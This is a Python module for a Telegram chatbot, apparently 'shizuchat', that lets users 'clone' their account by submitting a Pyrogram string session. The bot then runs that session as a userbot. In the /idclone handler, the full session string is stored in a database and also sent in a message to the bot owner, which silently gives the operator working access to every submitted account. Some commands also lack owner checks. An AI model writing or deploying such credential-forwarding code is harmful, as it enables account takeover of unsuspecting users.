import logging
import os
import sys
import shutil
import config
import asyncio
from pyrogram import Client, filters
from pyrogram.errors.exceptions.bad_request_400 import AccessTokenInvalid
from pyrogram.types import BotCommand
from config import API_HASH, API_ID, OWNER_ID
from shizuchat import CLONE_OWNERS
from shizuchat import shizuchat as app, save_clonebot_owner, save_idclonebot_owner
from shizuchat import db as mongodb

IDCLONES = set()
cloneownerdb = mongodb.cloneownerdb
idclonebotdb = mongodb.idclonebotdb


@app.on_message(filters.command(["idclone"]))
async def clone_txt(client, message):
    if len(message.command) > 1:
        string_session = message.text.split("/idclone", 1)[1].strip()
        mi = await message.reply_text("ᴄʜᴇᴄᴋɪɴɢ ʏᴏᴜʀ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ...")
        try:
            ai = Client(
                name="BADIDCHATBOT",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=str(string_session),
                no_updates=False,
                plugins=dict(root="shizuchat.user"),
            )
            await ai.start()
            user = await ai.get_me()
            clone_id = user.id
            user_id = user.id
            username = user.username or user.first_name
            await save_idclonebot_owner(clone_id, message.from_user.id)
            
            details = {
                "user_id": user.id,
                "username": username,
                "name": user.first_name,
                "session": string_session,
            }

            cloned_bots = idclonebotdb.find()
            cloned_bots_list = await cloned_bots.to_list(length=None)
            total_clones = len(cloned_bots_list)

            await app.send_message(
                int(OWNER_ID), f"**#New_Clone**\n\n**User:** @{username}\n\n**Details:** {details}\n\n**Total Clones:** {total_clones}"
            )

            await idclonebotdb.insert_one(details)
            IDCLONES.add(user.id)

            await mi.edit_text(
                f"**ꜱᴇꜱꜱɪᴏɴ ꜰᴏʀ @{username} ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʟᴏɴᴇᴅ ❤️.**\n"
                f"**ʀᴇᴍᴏᴠᴇ ᴄʟᴏɴᴇ ʙʏ:** /delclone\n**ᴄʜᴇᴄᴋ ᴀʟʟ ᴄʟᴏɴᴇᴅ ꜱᴇꜱꜱɪᴏɴꜱ ʙʏ** /cloned"
            )
        except AccessTokenInvalid:
            await mi.edit_text("**ɪɴᴠᴀʟɪᴅ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ. ᴘʟᴇᴀꜱᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ᴏɴᴇ😑**")
        except Exception as e:
            logging.exception("ᴇʀʀᴏʀ ᴅᴜʀɪɴɢ ᴄʟᴏɴɪɴɢ ᴘʀᴏᴄᴇꜱꜱ..")
            await mi.edit_text(f"**ᴇʀʀᴏʀ** `{e}`")
    else:
        await message.reply_text("**ᴘʀᴏᴠɪᴅᴇ ᴀ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴀꜰᴛᴇʀ ᴛʜᴇ /idclone ᴄᴏᴍᴍᴀɴᴅ.**")


@app.on_message(filters.command("idcloned"))
async def list_cloned_sessions(client, message):
    try:
        cloned_bots = idclonebotdb.find()
        cloned_bots_list = await cloned_bots.to_list(length=None)
        if not cloned_bots_list:
            await message.reply_text("**ɴᴏ ꜱᴇꜱꜱɪᴏɴꜱ ʜᴀᴠᴇ ʙᴇᴇɴ ᴄʟᴏɴᴇᴅ ʏᴇᴛ.**")
            return

        total_clones = len(cloned_bots_list)
        text = f"**ᴛᴏᴛᴀʟ ᴄʟᴏɴᴇᴅ ꜱᴇꜱꜱɪᴏɴꜱ** {total_clones}\n\n"
        for bot in cloned_bots_list:
            text += f"**ᴜꜱᴇʀ ɪᴅ:** `{bot['user_id']}`\n"
            text += f"**ɴᴀᴍᴇ:** {bot['name']}\n"
            text += f"**ᴜꜱᴇʀɴᴀᴍᴇ:** @{bot['username']}\n\n"

        await message.reply_text(text)
    except Exception as e:
        logging.exception(e)
        await message.reply_text("**ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ ᴡʜɪʟᴇ ʟɪꜱᴛɪɴɢ ᴄʟᴏɴᴇᴅ ꜱᴇꜱꜱɪᴏɴꜱ.**")


@app.on_message(
    filters.command(["delidclone", "deleteidclone", "removeidclone"])
)
async def delete_cloned_session(client, message):
    try:
        if len(message.command) < 2:
            await message.reply_text("**⚠️ ᴘʟᴇᴀꜱᴇ ᴘʀᴏᴠɪᴅᴇ ᴛʜᴇ ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ ᴀꜰᴛᴇʀ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ.**")
            return

        string_session = " ".join(message.command[1:])
        ok = await message.reply_text("**ᴄʜᴇᴄᴋɪɴɢ ᴛʜᴇ ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ..**")

        cloned_session = await idclonebotdb.find_one({"session": string_session})
        if cloned_session:
            await idclonebotdb.delete_one({"session": string_session})
            IDCLONES.remove(cloned_session["user_id"])

            await ok.edit_text(
                f"**ꜱᴇꜱꜱɪᴏɴ ꜰᴏʀ `{cloned_session['username']}` ʜᴀꜱ ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ ꜰʀᴏᴍ ᴍʏ ᴅᴀᴛᴀʙᴀꜱᴇ ✅**"
            )
        else:
            await message.reply_text("**⚠️ ᴛʜᴇ ᴘʀᴏᴠɪᴅᴇᴅ ꜱᴇꜱꜱɪᴏɴ ɪꜱ ɴᴏᴛ ɪɴ ᴛʜᴇ ᴄʟᴏɴᴇᴅ ʟɪꜱᴛ.**")
    except Exception as e:
        await message.reply_text(f"**ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ ᴡʜɪʟᴇ ᴅᴇʟᴇᴛɪɴɢ ᴛʜᴇ ᴄʟᴏɴᴇᴅ ꜱᴇꜱꜱɪᴏɴ:** {e}")
        logging.exception(e)


@app.on_message(filters.command("delallidclone") & filters.user(int(OWNER_ID)))
async def delete_all_cloned_sessions(client, message):
    try:
        a = await message.reply_text("**ᴅᴇʟᴇᴛɪɴɢ ᴀʟʟ ᴄʟᴏɴᴇᴅ ꜱᴇꜱꜱɪᴏɴꜱ..**")
        await idclonebotdb.delete_many({})
        IDCLONES.clear()
        await a.edit_text("**ᴀʟʟ ᴄʟᴏɴᴇᴅ ꜱᴇꜱꜱɪᴏɴꜱ ʜᴀᴠᴇ ʙᴇᴇɴ ᴅᴇʟᴇᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ✅**")
    except Exception as e:
        await a.edit_text(f"**ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ ᴡʜɪʟᴇ ᴅᴇʟᴇᴛɪɴɢ ᴀʟʟ ᴄʟᴏɴᴇᴅ ꜱᴇꜱꜱɪᴏɴꜱ** {e}")
        logging.exception(e)



async def restart_idchatbots():
    global IDCLONES
    try:
        logging.info("ʀᴇꜱᴛᴀʀᴛɪɴɢ ᴀʟʟ ᴄʟᴏɴᴇᴅ ꜱᴇꜱꜱɪᴏɴꜱ...")
        sessions = [session async for session in idclonebotdb.find()]
        
        async def restart_session(session):
            string_session = session["session"]
            ai = Client(
                name="BADIDCHATBOT",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=str(string_session),
                no_updates=False,
                plugins=dict(root="shizuchat.user"),
            )
            try:
                await ai.start()
                user = await ai.get_me()
                
                if user.id not in IDCLONES:
                    IDCLONES.add(user.id)

                logging.info(f"ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʀᴇꜱᴛᴀʀᴛᴇᴅ ꜱᴇꜱꜱɪᴏɴ ꜰᴏʀ: @{user.username or user.first_name}")
            except Exception as e:
                logging.exception(f"ᴇʀʀᴏʀ ᴡʜɪʟᴇ ʀᴇꜱᴛᴀʀᴛɪɴɢ ꜱᴇꜱꜱɪᴏɴ ꜰᴏʀ: {session['username']}. ʀᴇᴍᴏᴠɪɴɢ ɪɴᴠᴀʟɪᴅ ꜱᴇꜱꜱɪᴏɴ.")
                await idclonebotdb.delete_one({"session": string_session})

        await asyncio.gather(*(restart_session(session) for session in sessions))

        logging.info("ᴀʟʟ ꜱᴇꜱꜱɪᴏɴꜱ ʀᴇꜱᴛᴀʀᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ.")
    except Exception as e:
        logging.exception("ᴇʀʀᴏʀ ᴡʜɪʟᴇ ʀᴇꜱᴛᴀʀᴛɪɴɢ ꜱᴇꜱꜱɪᴏɴꜱ.")
